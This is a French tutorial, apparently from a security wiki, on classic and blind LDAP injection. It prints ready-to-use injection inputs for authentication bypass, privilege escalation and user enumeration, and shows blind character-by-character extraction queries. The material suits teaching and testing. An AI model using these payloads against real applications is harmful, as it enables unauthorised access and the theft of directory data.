# LDAP Injection & Blind LDAP Injection

## <mark style="color:red;">LDAP Injection & Blind LDAP Injection</mark>

### <mark style="color:blue;">📋 Introduction</mark>

#### <mark style="color:green;">Contexte</mark>

Les services LDAP sont des composants clés dans les entreprises, utilisés pour l'authentification et la gestion centralisée des informations. Plus de 50% des vulnérabilités des applications web sont liées à la validation des entrées utilisateur, permettant l'exploitation de techniques d'injection de code.

#### <mark style="color:green;">Problématique</mark>

Lorsque les applications construisent des requêtes LDAP sans valider correctement les entrées utilisateur, les attaquants peuvent manipuler ces requêtes pour accéder à des informations sensibles de l'annuaire LDAP.

***

### <mark style="color:blue;">🔍 Fondamentaux LDAP</mark>

#### <mark style="color:green;">Qu'est-ce que LDAP ?</mark>

**LDAP** (Lightweight Directory Access Protocol) est un protocole pour interroger et modifier des services d'annuaire sur TCP/IP.

#### <mark style="color:green;">Implémentations principales</mark>

* **Microsoft ADAM** (Active Directory Application Mode)
* **OpenLDAP**

#### <mark style="color:green;">Structure des filtres LDAP</mark>

```
Filter = ( filtercomp )
Filtercomp = and / or / not / item
And = & filterlist
Or = | filterlist
Not = ! filter
Item = simple / present / substring
```

#### <mark style="color:green;">Opérateurs disponibles</mark>

* **Logiques** : `&` (AND), `|` (OR), `!` (NOT)
* **Relationnels** : `=`, `>=`, `<=`, `~=`
* **Spéciaux** : `*` (joker), `(&)` (TRUE absolu), `(|)` (FALSE absolu)

#### <mark style="color:green;">Utilisations typiques</mark>

* Contrôle d'accès (vérification login/password)
* Gestion des privilèges
* Gestion des ressources

***

### <mark style="color:blue;">🎯 LDAP Injection Classique</mark>

#### <mark style="color:green;">Principe</mark>

Exploiter les paramètres utilisateur non filtrés pour manipuler les requêtes LDAP et contourner les contrôles de sécurité.

#### <mark style="color:green;">Architecture typique vulnérable</mark>

```
[Client Web] → [Serveur Web + App] → [Serveur LDAP Backend]
```

#### <mark style="color:green;">1️⃣ AND LDAP Injection</mark>

<mark style="color:orange;">**Structure de base**</mark>

```
(&(parameter1=value1)(parameter2=value2))
```

<mark style="color:orange;">**Exemple 1 : Contournement d'authentification**</mark>

**Requête normale :**

```
(&(USER=username)(PASSWORD=password))
```

**Injection :**

* **Entrée** : `username = slisberger)(&))`
* **Requête résultante** : `(&(USER=slisberger)(&))(PASSWORD=Pwd))`
* **Résultat** : Seul le premier filtre est traité : `(&(USER=slisberger)(&))` → **Toujours VRAI**
* **Impact** : Accès sans mot de passe valide

<mark style="color:orange;">**Exemple 2 : Élévation de privilèges**</mark>

**Requête normale :**

```
(&(directory=documents)(security_level=low))
```

<mark style="color:orange;">**Injection :**</mark>

* **Entrée** : `documents)(security_level=*))(&(directory=documents`
* **Requête résultante** : `(&(directory=documents)(security_level=*))(&(directory=documents)(security_level=low))`
* **Résultat** : Affichage de TOUS les documents (tous niveaux de sécurité)

#### <mark style="color:green;">2️⃣ OR LDAP Injection</mark>

<mark style="color:orange;">**Structure de base**</mark>

```
(|(parameter1=value1)(parameter2=value2))
```

**Exemple : Divulgation d'informations**

<mark style="color:orange;">**Requête normale :**</mark>

```
(|(type=printer)(type=scanner))
```

<mark style="color:orange;">**Injection :**</mark>

* **Entrée** : `printer)(uid=*`
* **Requête résultante** : `(|(type=printer)(uid=*))(type=scanner))`
* **Résultat** : Affichage de toutes les imprimantes ET tous les utilisateurs

***

### <mark style="color:blue;">🕵️ Blind LDAP Injection</mark>

#### <mark style="color:green;">Principe</mark>

Extraire des informations par des questions VRAI/FAUX lorsque l'application ne retourne pas de messages d'erreur explicites, mais montre des comportements différents selon le résultat de la requête.

#### <mark style="color:green;">1️⃣ AND Blind LDAP Injection</mark>

<mark style="color:orange;">**Requête de base**</mark>

```
(&(objectClass=printer)(type=Epson*))
```

<mark style="color:orange;">**Injection pour test**</mark>

```
*)(objectClass=*))(& (objectClass=void
```

<mark style="color:orange;">**Requête résultante**</mark>

```
(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Epson*))
```

**Résultat** : Le filtre `(objectClass=*)` retourne toujours des objets → **TRUE**

<mark style="color:orange;">**Tests d'inférence**</mark>

```
(&(objectClass=*)(objectClass=users))        → Icône affichée = TRUE
(&(objectClass=*)(objectClass=resources))    → Icône affichée = TRUE
(&(objectClass=*)(objectClass=fakevalue))    → Pas d'icône = FALSE
```

#### <mark style="color:green;">2️⃣ OR Blind LDAP Injection</mark>

<mark style="color:orange;">**Injection pour test**</mark>

```
(|(objectClass=void)(objectClass=void))
```

**Résultat** : Aucun objet retourné → **FALSE**

<mark style="color:orange;">**Tests d'inférence**</mark>

```
(|(objectClass=void)(objectClass=users))      → Icône affichée = TRUE
(|(objectClass=void)(objectClass=fakevalue))  → Pas d'icône = FALSE
```

***

### <mark style="color:blue;">🔬 Techniques d'exploitation avancées</mark>

#### <mark style="color:green;">1️⃣ Découverte d'attributs</mark>

**Objectif** : Identifier les attributs existants dans l'annuaire LDAP

**Exemple avec un objet imprimante :**

{% code fullWidth="true" %}
```
(&(idprinter=HPLaserJet2100)(ipaddress=*))(objectclass=printer))    → FALSE (attribut inexistant)
(&(idprinter=HPLaserJet2100)(department=*))(objectclass=printer))   → TRUE (attribut existe)
```
{% endcode %}

#### <mark style="color:green;">2️⃣ Booleanisation</mark>

**Objectif** : Extraire les valeurs caractère par caractère

**Processus pour extraire "financial" :**

{% code fullWidth="true" %}
```
(&(idprinter=HPLaserJet2100)(department=a*))   → FALSE
(&(idprinter=HPLaserJet2100)(department=f*))   → TRUE
(&(idprinter=HPLaserJet2100)(department=fa*))  → FALSE
(&(idprinter=HPLaserJet2100)(department=fi*))  → TRUE
(&(idprinter=HPLaserJet2100)(department=fin*)) → TRUE
...
```
{% endcode %}

**Pour les valeurs numériques**, utiliser les opérateurs `>=` et `<=`

#### <mark style="color:green;">3️⃣ Réduction du jeu de caractères</mark>

**Objectif** : Réduire le nombre de requêtes en identifiant d'abord les caractères présents

**Technique :**

{% code fullWidth="true" %}
```
(&(idprinter=HPLaserJet2100)(department=*b*))  → FALSE ('b' absent)
(&(idprinter=HPLaserJet2100)(department=*n*))  → TRUE ('n' présent)
(&(idprinter=HPLaserJet2100)(department=*f*))  → TRUE ('f' présent)
(&(idprinter=HPLaserJet2100)(department=*i*))  → TRUE ('i' présent)
...
```
{% endcode %}

**Avantage** : Une fois le jeu de caractères identifié, la booleanisation ne teste que ces caractères

***
